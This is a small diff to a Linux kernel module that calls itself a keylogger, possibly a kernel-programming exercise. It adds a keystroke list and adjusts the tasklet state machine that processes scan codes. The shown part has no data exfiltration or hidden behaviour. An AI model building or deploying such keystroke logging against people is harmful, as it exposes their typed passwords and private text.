@@ -16,6 +16,8 @@ static struct miscdevice keylogger_misc = {
 	.fops = &keylogger_misc_fops,
 };
 
+LIST_HEAD(keystroke_list);
+
 /* Assumption : if windex overrun rindex then static size is too small  */
 /* To be revised */
 
@@ -37,7 +39,7 @@ static void do_tasklet(unsigned long unused)
 		scan_fsm_update(&scan_fsm, packet);
 		if (scan_fsm.state == SUCCESS)
 			scan_fsm_send(&scan_fsm, keystroke_array);
-		else if (scan_fsm.state == ERROR)
+		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
 			scan_fsm_clear(&scan_fsm);	
 		/* state machine
 		 *  if SUCCESS, format packet and send it to buffer
